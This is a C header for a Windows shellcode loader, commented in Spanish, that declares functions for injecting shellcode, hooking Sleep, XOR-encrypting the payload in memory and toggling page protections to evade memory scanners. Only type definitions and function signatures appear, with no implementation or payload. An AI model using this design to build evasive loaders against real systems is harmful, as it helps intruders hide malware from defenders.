#ifndef HEADER_H
#define HEADER_H

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>

#ifdef _WIN64
typedef UINT64  UPTR;
#else
typedef UINT32  UPTR;
#endif

/* ---------- tipos de la fluctuación ---------- */
typedef enum {
    NoFluctuation = 0,
    FluctuateToRW,
    FluctuateToNA
} TypeOfFluctuation;

/* ---------- estructuras globales ------------- */
typedef void (WINAPI *typeSleep)(DWORD ms);
typedef DWORD (NTAPI *typeNtFlushInstructionCache)(HANDLE,PVOID,ULONG);

typedef struct {
    typeSleep origSleep;
    BYTE      sleepStub[16];
} HookedSleep;

typedef struct {
    LPVOID shellcodeAddr;
    SIZE_T shellcodeSize;
    bool   currentlyEncrypted;
    DWORD  encodeKey;
    DWORD  protect;
} FluctuationMetadata;

typedef struct {
    BYTE *originalBytes;
    DWORD originalBytesSize;
    BYTE *previousBytes;
    DWORD previousBytesSize;
} HookTrampolineBuffers;

/* ---------- macros / utilidades -------------- */
#define log(...) do { printf(__VA_ARGS__); putchar('\n'); fflush(stdout); }while(0)

/* ---------- globales exportadas -------------- */
extern HookedSleep        g_hookedSleep;
extern FluctuationMetadata g_fluctuationData;
extern TypeOfFluctuation   g_fluctuate;

/* ---------- firmas de funciones -------------- */
bool hookSleep(void);
bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread);
bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize);
void initializeShellcodeFluctuation(LPVOID caller);
void shellcodeEncryptDecrypt(LPVOID caller);
bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b);
void xor32(uint8_t *buf, SIZE_T sz, uint32_t key);
bool isShellcodeThread(LPVOID addr);
LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp);

#endif
